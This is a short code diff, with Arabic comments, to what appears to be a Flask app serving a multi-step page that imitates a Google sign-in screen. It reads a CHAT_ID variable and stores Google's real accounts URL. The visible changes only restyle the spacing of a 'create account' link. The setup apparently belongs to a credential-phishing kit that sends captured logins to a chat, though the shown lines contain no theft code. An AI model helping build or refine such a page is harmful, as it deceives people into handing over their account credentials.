@@ -12,7 +12,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: إزاحة دقيقة وثابتة لإنشاء حساب باستخدام transform
+# الصفحة الأولى: ضبط المسافة بين العناصر بشكل متناسق وثابت
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
@@ -125,11 +125,9 @@ def step1():
         }
         .links-container a:hover { text-decoration: underline; }
 
-        /* إجبار الكلمة على النزول للمكان المطلوب بغض النظر عن أي قيود بالمتصفح */
+        /* ضبط المسافة لتكون متوازنة وبدون التأثير على زر التالي */
         .create-account-link {
-            margin-top: 10px;
-            transform: translateY(120px);
-            display: inline-block;
+            margin-top: 35px; 
         }
 
         .footer-action {
